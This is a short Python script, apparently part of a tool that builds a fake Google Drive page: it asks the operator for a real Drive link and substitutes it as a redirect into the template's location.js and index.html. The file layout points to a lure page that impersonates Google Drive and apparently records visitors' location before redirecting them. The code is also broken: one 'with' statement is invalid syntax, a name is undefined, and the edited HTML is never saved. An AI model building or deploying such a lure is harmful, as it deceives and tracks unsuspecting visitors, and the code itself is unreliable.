#!/usr/bin/env python3

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

link = str(input(G + '[+]' + C + " Do you want to use custom link to real GDrive?(y/n): "))
if link in ['y', 'Y', 'yes', 'Yes', 'yeah', 'Yeah']:
	link = str(input(G + '[+]' + C + " Enter your link: " + W))
with open('template/gdrive_rus/js/location_temp.js', 'r') as js:
	reader = js.read()
	update = reader.replace('REDIRECT_URL', link)
with open('template/gdrive_rus/js/location.js', 'w') as js_update:
	js_update.write(update)
with open ('template/gdrive_rus/index.html', 'r') as index.html:
	repl = index.read()
	repl = repl.replace('$LINK$', link)
